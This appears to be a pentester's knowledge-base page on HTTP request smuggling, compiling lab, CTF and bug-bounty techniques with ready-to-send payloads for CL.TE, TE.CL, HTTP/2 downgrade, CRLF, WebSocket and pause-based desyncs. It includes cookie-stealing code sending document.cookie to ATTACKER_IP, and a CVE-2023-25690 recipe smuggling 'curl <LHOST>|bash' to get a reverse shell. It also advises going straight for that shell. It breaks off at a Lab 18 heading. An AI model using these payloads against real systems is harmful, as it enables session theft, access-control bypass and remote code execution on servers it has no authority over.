---
title: "HTTP Request Smuggling"
type: technique
tags: [exploitation, h1, portswigger, server-side, smuggling, thm, web]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-07-15
sources: [thm-adv-smuggling-pt1, thm-adv-smuggling-pt2, thm-adv-smuggling-ws, thm-adv-browser-desync, thm-elbandito-ctf, h1-scraped-http-request-smuggling, 0xdf-hard-insane, payloadsallthethings-request-smuggling, git-portswigger-all-labs, portswigger-browser-powered-desync, kettle-http1-must-die, te0-bugcrowd, flomb-http2-connect, hacktricks-web]

---

# HTTP Request Smuggling

## What it is

HTTP Request Smuggling (also called HTTP desync) exploits discrepancies in how a front-end proxy/load balancer and a back-end server interpret HTTP request boundaries. The attacker crafts a single ambiguous HTTP request that the two systems parse differently, causing the back end to treat part of the first request as the beginning of a next, separate request.

## How it works

HTTP/1.1 defines two headers that indicate message body length: `Content-Length` (number of bytes) and `Transfer-Encoding: chunked` (series of hex-prefixed chunks ending with `0`). When both appear in a request, RFC 7230 says to ignore `Content-Length`, but many implementations deviate. The front-end and back-end may each honour a different header, leading to a desynchronised pipeline where a smuggled prefix contaminates the next request.

### Key header formats

**Content-Length:**
```http
POST /submit HTTP/1.1
Content-Length: 14

q=smuggledData
```

**Transfer-Encoding chunked:**
```http
POST /submit HTTP/1.1
Transfer-Encoding: chunked

b          <- hex size (11 decimal)
q=smuggledData
0          <- end of chunks
```

## Prerequisites

- Target has a front-end proxy (load balancer, CDN, reverse proxy) forwarding to a back-end server over a shared TCP connection
- Front-end and back-end disagree on which header determines request boundaries
- HTTP/1.1 or HTTP/2-to-HTTP/1.1 downgrade in use
- Testing tool does not automatically rewrite `Content-Length`

## Variants

### CL.TE — Front-end uses Content-Length, Back-end uses Transfer-Encoding

```http
POST /search HTTP/1.1
Host: example.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /update HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

isadmin=true
```

- Front-end reads 130 bytes (entire thing as one request, forwards it)
- Back-end reads TE chunked, hits `0`, considers first request done
- `POST /update` is now poisoning the pipeline as a separate request

### TE.CL — Front-end uses Transfer-Encoding, Back-end uses Content-Length

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

78
POST /update HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

isadmin=true
0
```

- Front-end processes `78` (120 decimal) bytes as a chunk, sees `0` terminator, considers the full thing one request
- Back-end reads only 4 bytes per `Content-Length`, rest becomes a new request

### TE.TE — Both use Transfer-Encoding, but one has obfuscated/malformed header

```http
POST / HTTP/1.1
Content-length: 4
Transfer-Encoding: chunked
Transfer-Encoding: chunked1   <- non-standard, one server ignores it

4e
POST /update HTTP/1.1
...
0
```

One server ignores the malformed `chunked1` and processes the second `Transfer-Encoding: chunked` normally; the other falls back to `Content-Length: 4`, achieving a CL.TE or TE.CL situation.

**Common TE obfuscation techniques:**
```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked          <- space before colon
Transfer-Encoding: chunked           <- trailing space after value
Transfer-Encoding: chunked\t         <- tab after value
X: X\nTransfer-Encoding: chunked     <- header injection via newline
Transfer-Encoding
 : chunked                           <- header folding (line continuation)
```
The effective variant (CL.TE or TE.CL) depends on which server ignores the obfuscated header and falls back to the other length mechanism.

### CL.0 — Back-end ignores Content-Length entirely

Certain endpoints (static files, redirect responses, error handlers) cause the back-end to treat the request as having no body regardless of the `Content-Length` value. The front-end still forwards the full body, which the back-end queues as a new request.

```http
POST /resources/css/anything HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

GET /admin HTTP/1.1
Host: example.com
```

Detection: disable "Update Content-Length" in Burp Repeater, set a high CL value, and POST to static/redirect endpoints — if the server hangs or returns a timeout the endpoint may be CL.0 vulnerable. Confirm by smuggling a request to a non-existent path and observing a 404 on the follow-up request.

## Response Queue Poisoning

When a complete smuggled request is queued (rather than just a prefix), the back-end processes it and returns a response — but that response is delivered to the next legitimate user, and that user's response is delivered to the attacker. This rotates the entire response queue.

**H2.TE response queue poisoning:**

```http
POST /x HTTP/2
Host: example.com
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: example.com

```

1. Send the above; the back-end processes two requests: the POST and the smuggled GET.
2. Wait ~5 seconds, then send another arbitrary request.
3. If you receive a non-404 response, you captured a response meant for another user.
4. Repeat until you capture a 302 post-login redirect containing an admin session cookie.
5. Use the stolen cookie to access the admin panel.

**Tip:** If you keep getting 200s but no 302, send 10 ordinary requests to flush/reset the connection pool and retry.

## HTTP/2 Downgrade Variants

When a proxy accepts HTTP/2 on the front end and translates to HTTP/1.1 on the back end, HTTP/2's unambiguous length fields are lost during translation, re-enabling smuggling.

### H2.CL — Inject Content-Length into HTTP/2 request

Add a `content-length: 0` header to an HTTP/2 POST. The proxy passes it to HTTP/1.1. The back end reads CL=0, treats the request body as a new request:

```http
POST / HTTP/2
Host: target
content-length: 0

GET /post/like/12315198742342 HTTP/1.1
X: f
```

The victim's next request gets concatenated to the `GET /post/like/...` prefix — their cookies issue a like on the attacker's behalf.

### H2.TE — Inject Transfer-Encoding: chunked into HTTP/2

Same concept: the proxy passes `Transfer-Encoding: chunked` to HTTP/1.1 back end, which treats the HTTP/2 body as chunks and desyncs.

### CRLF Injection in HTTP/2 Headers

HTTP/2 allows binary data in header values. Injecting `\r\n` into an HTTP/2 header value can smuggle extra headers or full requests when the proxy translates to HTTP/1.1:

```
Foo: bar\r\nTransfer-Encoding: chunked\r\n\r\nSMUGGLED
```

## HTTP/2 Request Tunnelling

When the front-end does not reuse the back-end connection, classic smuggling (which depends on connection poisoning) does not work. However, CRLF injection in HTTP/2 headers can still achieve request tunnelling: a single HTTP/2 request triggers two back-end responses.

**Use HEAD to leak response sizes for tunnelling:**

Because a HEAD response includes the `Content-Length` of the equivalent GET body, the front-end uses that value to determine how many bytes of the next back-end response to forward. If you set the smuggled request's Content-Length larger than the home-page body, the server times out; tune it to match or exceed the target page size.

**Methodology for H2 tunnelling + cache poisoning:**
1. Confirm tunnelling works: inject a CRLF header into an HTTP/2 request; smuggle a GET to a non-existent path and observe 404.
2. Switch to HEAD to make the attack non-blind — the response headers of the smuggled request are returned.
3. Find a reflected parameter (e.g., a redirect path) to inject a JavaScript payload.
4. Pad the payload with enough characters so the Content-Length of the smuggled response exceeds the home page size.
5. Remove cache-buster parameters and poison the root path `/`.

**Access control bypass via HTTP/2 tunnelling:**
1. Add a custom header with a CRLF value pointing `Host` to a non-existent server — a timeout confirms CRLF injection works.
2. Use a reflected endpoint (e.g., search) as the sink to leak internal headers forwarded by the proxy.
3. Increase the inner `Content-Length` to expose more bytes of the forwarded headers (e.g., `X-SSL-VERIFIED`, `X-SSL-CLIENT-CN`).
4. Re-issue the tunnelled request with the internal headers set to impersonate an admin (`X-SSL-VERIFIED: 1`, `X-SSL-CLIENT-CN: administrator`).
5. Use HEAD to size the response correctly, then switch to a path that fits within the allocated bytes (e.g., `/?search=hacker` at ~3406 bytes fits within the 3608-byte window).

## WebSocket Smuggling

Some proxies assume a WebSocket upgrade is always completed once they forward the upgrade request, without checking the server's response code.

### Broken WebSocket tunnel (Varnish pattern)

Send an upgrade request with an invalid `Sec-WebSocket-Version` (e.g., `777`). The back end returns `426 Upgrade Required` (no real upgrade). The proxy, not checking the response, establishes a tunnel. Subsequent HTTP requests flow through unchecked:

```http
GET /socket HTTP/1.1
Host: target
Sec-WebSocket-Version: 777
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: target

```
(Two trailing newlines required in Burp Repeater; disable "Update Content-Length")

### Faking a WebSocket via SSRF (Nginx pattern)

When the proxy verifies the upgrade response, use an SSRF vulnerability to point the upgrade at an attacker-controlled server that returns `HTTP/1.1 101`. The proxy is tricked into believing the upgrade succeeded. Subsequent HTTP requests tunnel through to the backend unchecked:

```python
# Attacker server returning fake 101
class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()
```

Request:
```http
GET /check-url?server=http://ATTACKER_IP:5555 HTTP/1.1
Host: target
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: target

```

## Client-Side Desync (CSD)

Primary research: James Kettle (PortSwigger), "Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling" (2022), since extended to HTTP/3 transport. CSD is browser-deliverable and needs only a single server.

Unlike classic server-side smuggling (which requires two servers), CSD exploits a single server whose HTTP/1.1 implementation responds to a POST without consuming the full body. The victim's browser (reusing a keep-alive connection) sends a follow-up request that gets appended to the attacker's unprocessed body prefix.

**Requirements:**
- Server does not support HTTP/2 (most browsers prefer HTTP/2; CSD only works if the server is HTTP/1.1-only, or if a proxy forces HTTP/1.1)
- Single-server architecture is sufficient

**Attack flow:**
1. Victim visits attacker-controlled page containing JavaScript.
2. JS sends a crafted POST with a body whose Content-Length is larger than the actual body sent.
3. Server responds early (without reading the full declared body), leaving the prefix in the TCP socket buffer.
4. Browser reuses the connection for a second request; that request is appended to the malicious prefix.
5. The server processes the combined data as a new, attacker-controlled request.

**Detection workflow (Burp):**
1. Probe: send a POST with Content-Length larger than the body to candidate endpoints; if the server returns 302/200 without waiting, it's a candidate.
2. Confirm: send a smuggled prefix (e.g., a partial POST to a comment endpoint) and check whether the next request's data appears in stored content.
3. Build browser PoC: use `fetch()` with `mode: 'cors'` to trigger a CORS error that blocks the redirect (prevents the browser from following the poisoned response and consuming the smuggled data).
4. Identify a gadget (reflected parameter, stored comment, etc.) to exfiltrate the captured request.
5. Replicate in browser; use `mode: 'no-cors'` if needed and check the Network tab for evidence.

## Browser Desync (CVE-2022-29361 / Werkzeug pattern)

Werkzeug v2.1.0 enabled keep-alive connections. A POST request with a smuggled GET in the body can poison the connection queue; the next request from the same keep-alive connection picks up the smuggled request:

```javascript
// From victim's browser console or via XSS injection
fetch('http://target:5000/', {
    method: 'POST',
    body: 'GET /redirect HTTP/1.1\r\nFoo: x',
    mode: 'cors',
})
```

### Browser Desync + XSS to steal cookies

Inject this XSS gadget into a reflected/stored field (uses form POST to avoid encoding, keep-alive by default):

```html
<form id="btn" action="http://challenge.thm/"
    method="POST"
    enctype="text/plain">
<textarea name="GET http://ATTACKER_IP:1337 HTTP/1.1
AAA: A">placeholder1</textarea>
<button type="submit">placeholder2</button>
</form>
<script>btn.submit()</script>
```

Rogue server serves a cookie-stealing payload:
```python
class ExploitHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"fetch('http://ATTACKER_IP:8080/' + document.cookie)")
```

## Pause-Based (Server-Side CL.0)

Some back-end servers (notably Apache 2.4.52) ignore the `Content-Length` on endpoints that trigger server-level redirects (e.g., a directory path without trailing slash). By sending the body slowly — pausing after headers — the server commits to the first request before the body arrives and treats the body as a new request.

**Tool: Turbo Intruder** (Burp extension) with a `pauseMarker` to inject a timed delay.

**Methodology:**
1. Identify a redirect endpoint (e.g., `GET /resources` → 301 to `/resources/`).
2. Convert to POST, add `Connection: keep-alive`.
3. In Turbo Intruder, use `pauseMarker` to pause **61 seconds** after the request headers before sending the body:

```python
engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
engine.queue(target.req)
```

4. The body contains the smuggled request:

```http
POST /resources HTTP/1.1
Host: example.com
Cookie: session=YOUR-SESSION
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

GET /admin/ HTTP/1.1
Host: localhost

```

5. After 61 seconds, two results appear: the POST (normal redirect) and the smuggled GET response.
6. If the smuggled GET shows "admin only accessible to local users", change `Host` to `localhost` in the smuggled request and relaunch.
7. To delete a user, smuggle a full POST to `/admin/delete/`:

```http
POST /admin/delete/ HTTP/1.1
Host: localhost
Content-Type: x-www-form-urlencoded
Content-Length: CORRECT

csrf=YOUR-CSRF-TOKEN&username=carlos
```

**Key note:** Update `pauseMarker` to match only the first header block's end to avoid pausing mid-smuggled-body:
```python
pauseMarker=['Content-Length: CORRECT\r\n\r\n']
```

## h2c Smuggling (h2c Upgrade Bypass)

Some proxies forward the `Upgrade: h2c` headers to the back end, which then establishes a direct HTTP/2 tunnel bypassing the proxy's ACL:

```bash
python3 h2csmuggler.py -x https://target:8200/ https://target:8200/private
```

Useful for bypassing path-based ACL rules on front-end proxies.

## HTTP/2 CONNECT internal port scanning and tunnelling

Distinct from h2c smuggling (which upgrades to a raw HTTP/2 tunnel to dodge a proxy ACL): here the proxy's own HTTP/2 `CONNECT` support is turned into an internal port scanner and TCP tunnel. Basis: @flomb, "Playing with HTTP/2 CONNECT" (2025 top-10 #9). In HTTP/1 a `CONNECT` hijacks the whole TCP connection; in HTTP/2 it operates per **stream**, so many independent tunnels multiplex over one connection to the proxy.

Open a tunnel by sending a `HEADERS` frame carrying only `:method: CONNECT` and `:authority: <internal-ip>:<port>` (no `:scheme`, no `:path`):

```
HEADERS
  :method    = CONNECT
  :authority = 10.0.0.5:6379
```

**Open/closed oracle** from the proxy's reply:

| Result | Signal |
|---|---|
| Open port | `HEADERS` with `:status 200` |
| Closed / filtered | `:status 503`, plus a `RST_STREAM` (`CONNECT_ERROR` on Envoy, `NO_ERROR` on Apache), optional `DATA` error frame |

The `RST_STREAM` frame is the most reliable open-vs-closed discriminator, and you do not need to send any `DATA` frame; response frames alone reveal port status. Fan out `CONNECT` requests across many stream IDs in parallel for a fast multiplexed internal scan. Once a tunnel returns `:status 200`, `DATA` frames on that stream are relayed as raw TCP to the internal service, so arbitrary protocols (Redis, internal HTTP, databases) tunnel straight through the proxy, and the traffic looks like ordinary HTTP/2 to monitoring that cannot inspect multiplexed streams.

Affected: Envoy and Apache httpd with HTTP/2 `CONNECT` enabled. Drive it with an HTTP/2 client that lets you craft frames directly (`nghttp2` / a Python `h2` script); plain curl will not emit a bare `CONNECT` with an arbitrary `:authority`.

Defence: disable HTTP/2 `CONNECT` on forward-facing proxies unless required; restrict `:authority` targets to an allowlist; do not let RFC 1918 / `169.254.169.254` be tunnel destinations.

## Methodology

1. **Identify infrastructure** — determine if a front-end proxy is in use (via response headers, timing, error pages)
2. **Detect desync** — use Burp's HTTP Request Smuggler extension, or manually craft CL.TE / TE.CL payloads
3. **Timing attack for detection** — a CL.TE payload with a large CL and a `0`-chunk TE body will cause the back end to wait (time delay indicates vulnerability)
4. **Capture other users' requests** — smuggle an incomplete POST to an endpoint that reflects body data; victim's next request appends to your poison
5. **Count bytes carefully** — the smuggled request body must use the correct byte count (count CRLF pairs: each newline is 2 bytes `\r\n`)
6. **Bypass front-end restrictions** — smuggle requests to `/admin` or other ACL-blocked paths
7. **Web cache poisoning** — smuggle a request to a cached resource to serve malicious content from cache

## CL.TE Exploitation Walkthrough (THM Lab)

ATS (front-end) uses CL; Nginx (back-end) uses TE. Payload captures next user's request via contact form:

```http
POST / HTTP/1.1
Host: httprequestsmuggling.thm
Content-Type: application/x-www-form-urlencoded
Content-Length: 160
Transfer-Encoding: chunked

0

POST /contact.php HTTP/1.1
Host: httprequestsmuggling.thm
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

username=test&query=
```

Run via Burp Intruder with Null payloads (~10,000 requests, 1 thread). Check `/submissions` directory for captured victim requests containing credentials.

## H2.CL Capture (Elbandito CTF)

```http
POST / HTTP/2
Host: elbandito.thm:80
Cookie: session=<your_session>
Content-Length: 0

POST /send_message HTTP/1.1
Host: elbandito.thm:80
Cookie: session=<your_session>
Content-Type: application/x-www-form-urlencoded
Content-Length: 730

data=
```

Wait for bot's request to arrive; check `/getMessages` for captured credential cookies.

## Real-World Examples (HackerOne — paid reports)

21 paid reports (3 critical). Top bounty: $20,000 (PayPal — stored XSS via cache poisoning).

| Title | Severity | Bounty | Program | Report |
|-------|----------|--------|---------|--------|
| HTTP Request Smuggling via HTTP/2 | Critical | $7,500 | Basecamp | [#1211724](https://hackerone.com/reports/1211724) |
| Transform Rules via hex escape sequences in concat() | Critical | $6,000 | Cloudflare | [#1478633](https://hackerone.com/reports/1478633) |
| Origin Rules via newlines in host_header parameter | Critical | $3,100 | Cloudflare | [#1575912](https://hackerone.com/reports/1575912) |
| Bypass enables stored XSS on paypal.com/signin | High | $20,000 | PayPal | [#510152](https://hackerone.com/reports/510152) |
| Stored XSS via cache poisoning on paypal.com/signin | High | $18,900 | PayPal | [#488147](https://hackerone.com/reports/488147) |
| Possibility of Request Smuggling attack | High | $4,660 | Internet Bug Bounty | [#2280391](https://hackerone.com/reports/2280391) |
| Apache Tomcat smuggling — CVE-2023-45648 | High | $4,660 | Internet Bug Bounty | [#2299692](https://hackerone.com/reports/2299692) |
| CVE-2024-21733 Apache Tomcat Client-Side Desync | High | $4,660 | Internet Bug Bounty | [#2327341](https://hackerone.com/reports/2327341) |
| Pause-based desync in Apache HTTPD | High | $4,000 | Internet Bug Bounty | [#1667974](https://hackerone.com/reports/1667974) |
| HTTP Request Smuggling on labs.data.gov | High | $750 | GSA Bounty | [#726773](https://hackerone.com/reports/726773) |
| HTTP request smuggling in pscp.tv / periscope.tv | High | $560 | X / xAI | [#713285](https://hackerone.com/reports/713285) |
| Incorrect Parsing of Header Fields | Medium | $1,800 | Internet Bug Bounty | [#1888760](https://hackerone.com/reports/1888760) |
| Empty headers separated by CR | Medium | $1,800 | Internet Bug Bounty | [#2032842](https://hackerone.com/reports/2032842) |
| CVE-2022-32213 — Flawed Parsing of Transfer-Encoding | Medium | $1,800 | Internet Bug Bounty | [#1630668](https://hackerone.com/reports/1630668) |
| CVE-2022-32215 — Multi-line Transfer-Encoding | Medium | $1,800 | Internet Bug Bounty | [#1630667](https://hackerone.com/reports/1630667) |

**Key patterns from reports:**
- HTTP/2 downgrade remains the dominant vector for critical-severity smuggling bugs (Basecamp $7.5k, Cloudflare $6k/$3.1k)
- Smuggling chained with cache poisoning to store XSS achieved the highest bounties ($20k and $18.9k at PayPal)
- Apache Tomcat and Apache HTTPD are recurring targets — CVE-2023-45648, CVE-2024-21733, and pause-based desyncs all paid $4k+ via Internet Bug Bounty
- Malformed or duplicate Transfer-Encoding headers in HTTP/1.1 (CL.TE/TE.TE) still yield medium bounties for parser-level CVEs

## From the Wild — smuggling opens internal HTTP (HTB Insane, `0xdf-hard-insane`)

**Sink** aligns **frontend HaProxy** semantics with backend **Gunicorn/Gitea** so crafted **Transfer-Encoding splits** splice attacker-controlled bodies into neighbouring sessions—exactly where CL.TE tooling maps. Pivot phase chains into **mocked AWS primitives** (**LocalStack**, Secrets Manager wraps, KMS) once internal-only HTTP routers become reachable via desync—not just classic cache poisoning wins.

Operational note baked into the storyline: flawed HTTP stacks amplify colliding sessions when multiple researchers share pipelines; instrument **timeouts** aggressively when fuzzing mirrored prod paths.

## CVE-2023-25690: Apache mod_proxy/mod_rewrite path CRLF (reach an unrouted backend sink)

A distinct class from CL.TE/TE: the desync is in the **proxied request line**, not the body. When Apache `mod_proxy` builds the upstream request from a `RewriteRule` capture used unencoded, raw CRLF in the captured group splits the proxied request, letting you smuggle a **second full request to a backend endpoint the proxy never routes externally**. Affects Apache 2.4.0 through 2.4.55 with a pattern like:

```apache
RewriteRule "^/page/(.*)" "http://backend:8080/index.php?page=$1" [P]
```

`$1` is taken from the decoded URL path and substituted into the upstream request line without re-encoding, so `%0d%0a` in the path becomes a real CRLF upstream.

**Working recipe (THM Contrabando: front proxies `/page/` to a backend that also serves an unrouted `gen.php` command-injection sink).** Everything after `/page/` is one URL; Apache decodes it once to build `$1`. Smuggle a POST to `/gen.php`:

```
/page/x%20HTTP/1.1%0d%0aHost:localhost%0d%0a%0d%0aPOST%20/gen.php%20HTTP/1.1%0d%0aHost:localhost%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aContent-Length:31%0d%0a%0d%0alength=;curl%20<LHOST>|bash;
```

Backend parses two requests: `GET /index.php?page=x` then `POST /gen.php` with body `length=;curl <LHOST>|bash;`.

Byte-level gotchas (each costs hours if wrong):
- **Leading `x` is required**: the rewrite needs at least one captured char; a leading `%20` makes the request line `GET  HTTP/1.1` and 404s.
- `%20` (decoded space) terminates Apache's request-line URL parse, which is exactly what ends the first request so `HTTP/1.1%0d%0a...` can start the smuggled block. Do not put a decoded space anywhere you need to survive into `$1`.
- **`&` must be `%26`** inside the smuggled body (form-field separator; a raw `&` truncates `length`).
- **Content-Length must equal the decoded body** byte count exactly.

**Efficiency, avoid slashes entirely.** The front 404s a literal `/` in the body and the LFI needs double-encoding (`%252f`, front decodes once to `%2f`, PHP form-decodes to `/`). Sidestep all of it: host the payload at web-root `index.html` and inject `length=;curl <LHOST>|bash;`. `curl <IP>` has no slashes, fetches `/`, pipes a reverse shell. One short body, trivial CL.

**No-egress fallback (blind, no reverse shell):** write output to a tmp file and read it back through the same front via the LFI: `length=;id>%252ftmp%252fo;` then `GET /page/%252ftmp%252fo`. Slower and racy for long commands; if egress exists prefer `curl|bash`. For long commands, host a script and inject the short `curl <IP>|bash` instead of cramming the command into the smuggled URL (URL and CL length limits truncate it).

Detect: backend `Server:` header differs from the front, a `/page/`-style path-proxy, Apache 2.4.x at or below 2.4.55. Fuzz the proxied prefix (`ffuf -u .../page/FUZZ -e .php -fw <readfile-error-wordcount>`) to find the unrouted sink before smuggling. See [[reverse-proxy-attacks]], [[path-traversal-lfi]], [[os-command-injection]].

**Efficiency once a sink is confirmed: go straight for a reverse shell, don't build the slow blind chain first.** The moment ANY command-injection sink reached via smuggling (or any other desync-delivered primitive) is confirmed, try `curl <LHOST>|bash` immediately rather than defaulting to a blind write-to-file + LFI-read-back loop — the blind chain is a fallback for when egress is actually blocked, not the default path. Sidestep body-encoding limits (a front that 404s a literal `/` in the body, or double-encoding requirements for slashes) by hosting the payload at web-root `index.html` and injecting a slash-free `curl <IP>|bash`: no LFI double-encoding, no chunked multi-request race, one short body.

---

## Detection and Defence

| Defence | Notes |
|---------|-------|
| Normalise requests at front-end | Strip ambiguous headers before forwarding |
| Disable HTTP/1.1 keep-alive on back end | Prevents poisoning other users' requests |
| Use HTTP/2 end-to-end | Eliminates CL/TE ambiguity |
| Reject requests with both CL and TE | Most robust fix |
| Verify WebSocket upgrade response | Proxy must check status code before tunnelling |

**Caution:** Testing on production can break caches, disrupt other users' requests, and fully desync the pipeline. Test in isolated environments.

## Tools

- [[burp-suite]] — HTTP Request Smuggler extension, Repeater, Intruder
- `h2csmuggler` (BishopFox) — automated h2c tunnel bypass
- `defparam/smuggler` — An HTTP Request Smuggling / Desync testing tool written in Python 3
- `dhmosfunk/simple-http-smuggler-generator` — Tool developed for Burp Suite practitioner certificate exam and HTTP Request Smuggling labs

## PortSwigger Labs

### PRACTITIONER Labs

#### Lab 1 — CL.TE confirmation via differential responses (Practitioner)
Send the smuggling payload once (200 OK), then send any normal request — the second request returns 404 because the smuggled `GET /404` prefix was prepended to it.

```http
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

#### Lab 2 — TE.CL confirmation via differential responses (Practitioner)
Front-end uses TE, back-end uses CL. `5e` = 94 decimal — the chunk size covers the smuggled POST body. Second request returns 404.

```http
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

#### Lab 3 — Bypass front-end access controls, CL.TE (Practitioner)
Admin panel blocked externally. Use CL.TE to smuggle a request with `Host: localhost`. Calculate the byte length of the smuggled portion using Burp Inspector (hex value shown). Send twice: first returns 200, second returns the admin panel.

#### Lab 4 — Bypass front-end access controls, TE.CL (Practitioner)
Same goal as Lab 3 but TE.CL variant. Chunk size in hex (e.g., `60` = 96 bytes). Uncheck "Update Content-Length" in Repeater. Use two Repeater tabs: attacker tab sends smuggle, normal tab confirms 404/admin access.

#### Lab 5 — Reveal front-end request rewriting (Practitioner)
CL.TE lab. Admin panel requires `X-*-IP: 127.0.0.1` header added by the front-end. Smuggle a POST to a search endpoint (body echoed in response) with a large Content-Length to capture the rewritten request and reveal the internal header name.

#### Lab 6 — Capture other users' requests (Practitioner)
CL.TE. Smuggle a POST to a comment endpoint with `comment=` as the last parameter and Content-Length ~950 (larger than actual body sent). The back-end waits for remaining bytes; the victim's next request completes the body. The victim's session cookie appears in the stored comment.

```http
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=YOUR-SESSION

csrf=TOKEN&postId=5&name=Attacker&email=a@b.com&website=&comment=
```

#### Lab 7 — Deliver reflected XSS via smuggling (Practitioner)
`User-Agent` header is reflected in a hidden comment form field. CL.TE: smuggle a GET to the blog post with a malicious User-Agent. The next visitor's request is prefixed with the smuggled GET, triggering XSS in their browser.

```http
POST / HTTP/1.1
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

#### Lab 8 — Response queue poisoning via H2.TE (Practitioner)
Use HTTP/2 + `Transfer-Encoding: chunked` to smuggle a complete request. Both requests target non-existent paths so normal responses are 404 — any other status means a victim response was captured. Repeat until a 302 post-login redirect with admin session cookie is received.

```http
POST /x HTTP/2
Host: LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: LAB-ID.web-security-academy.net

```

#### Lab 9 — H2.CL request smuggling (Practitioner)
HTTP/2 + `Content-Length: 0` to smuggle a GET to `/resources` with a custom `Host` pointing to exploit server. When the victim loads a page that imports `/resources/`, they are redirected to the exploit server which serves `alert(document.cookie)`.

```http
POST / HTTP/2
Host: LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: EXPLOIT-SERVER
Content-Length: 5

x=1
```

#### Lab 10 — HTTP/2 CRLF injection to capture requests (Practitioner)
Add a custom HTTP/2 header using Burp Inspector; use Shift+Enter in the header value field to insert real CRLF characters (not literal `\r\n`). Inject `Transfer-Encoding: chunked` after the CRLF. Then smuggle a POST to the search endpoint with `Content-Length: 800` and `search=x` — the back-end waits for 800 bytes and captures the victim's request start into the search history.

#### Lab 11 — HTTP/2 request splitting via CRLF injection (Practitioner)
Inject a complete smuggled request into an HTTP/2 header value using double CRLF (Shift+Enter twice in Burp Inspector). The `\r\n\r\n` terminates the first request; the appended GET is queued as a separate request. Repeat until a 302 response with admin cookie is captured, then access `/admin/delete?username=carlos`.

```
Header name: foo
Header value: bar\r\n\r\nGET /x HTTP/1.1\r\nHost: LAB-ID.web-security-academy.net
```

#### Lab 12 — CL.0 request smuggling (Practitioner)
Front-end honours CL, back-end ignores it for static endpoints. Find a static/redirect path, POST to it with a smuggled body containing `GET /admin`. Use Burp Repeater grouped tabs (send in sequence on same connection) to confirm 404 on follow-up, then smuggle admin access.

#### Lab 13 — Basic CL.TE (Practitioner)
Switch Burp Repeater to HTTP/1.1 (Inspector panel → Request attributes). Change GET to POST. CL=6, TE=chunked. Send twice; first returns 200, second returns "GPOST" unknown method error (the `G` prefix left from the smuggled chunk was prepended to the next POST).

```http
POST / HTTP/1.1
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

#### Lab 14 — Basic TE.CL (Practitioner)
Switch to HTTP/1.1. Uncheck "Update Content-Length". CL=4, TE=chunked. Chunk size `5c` (hex) = 92 bytes covers the smuggled GPOST. Second request triggers GPOST error.

```http
POST / HTTP/1.1
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

#### Lab 15 — Obfuscating the TE header / TE.TE (Practitioner)
Both servers support TE. Place a second `Transfer-Encoding` with an invalid value (e.g., `Transfer-Encoding: chunked1`) after the valid one. Reorder headers until the back-end ignores the obfuscated TE and falls back to CL, making it a TE.CL scenario. Then apply the TE.CL GPOST payload.

---

### EXPERT Labs

#### Lab 16 — Web cache poisoning via smuggling (Expert)
CL.TE. Smuggle a GET to `/post/next?postId=3` with a custom `Host` pointing to exploit server. Fetch `/resources/js/tracking.js` repeatedly — if you receive a redirect to the exploit server, the cache is poisoned. Host the JS payload (`alert(document.cookie)`) at `/post` on the exploit server before poisoning.

```http
POST / HTTP/1.1
Content-Length: 129
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: EXPLOIT-SERVER
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

#### Lab 17 — Web cache deception via smuggling (Expert)
CL.TE. Smuggle a GET to `/my-account` (authenticated endpoint). The next user's request (e.g., to `tracking.js`) gets appended — the back-end serves the `/my-account` response, which is then cached against the static URL. Retrieve the cached victim API key by visiting `tracking.js`.

```http
POST / HTTP/1.1
Content-Length: 39
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
X-Foo: x
```

#### Lab 18 — Bypass access controls via HTTP/2 request tunnelling (Expert)
